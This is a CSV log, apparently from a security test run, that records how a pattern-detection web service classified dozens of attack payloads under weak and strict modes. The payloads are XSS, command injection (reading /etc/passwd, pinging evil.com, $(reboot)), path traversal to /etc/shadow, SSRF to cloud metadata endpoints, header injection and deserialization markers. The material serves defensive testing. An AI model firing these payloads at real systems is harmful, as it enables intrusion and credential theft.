timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,http_handler,response_body
2025-10-13T15:23:35.552049,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:35.558271,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:35.666342,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:35.673428,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:35.782618,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:35.789135,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:35.896806,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:35.903409,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.012468,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.018915,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.128734,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:23:36.135972,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:23:36.242601,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.249254,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.358371,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.360840,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.468176,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.475783,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.579857,Cmd Injection,Backticks,`uname -a`,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.586188,Cmd Injection,Backticks,`uname -a`,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.695175,Cmd Injection,Command Substitution,$(reboot),Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.702427,Cmd Injection,Command Substitution,$(reboot),Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.811614,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.818341,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.927520,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:36.935014,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.044101,Path Traversal,Root Directory,/etc/shadow,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.050612,Path Traversal,Root Directory,/etc/shadow,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.159806,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:23:37.167047,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:23:37.276036,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.282589,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.391777,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.394572,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.501942,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.509035,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.618654,SSRF,Localhost,http://localhost/admin,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.625817,SSRF,Localhost,http://localhost/admin,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.735423,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.742204,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.851423,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.858190,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.967823,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:37.975055,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.083982,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.090675,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.196819,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.203649,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.310082,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.317223,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.426550,Deserialization,Java RMI Header,JRMI,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.433095,Deserialization,Java RMI Header,JRMI,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.542162,Deserialization,Python Pickle,"cposix
system
",Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.548668,Deserialization,Python Pickle,"cposix
system
",Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.657872,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:23:38.665478,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
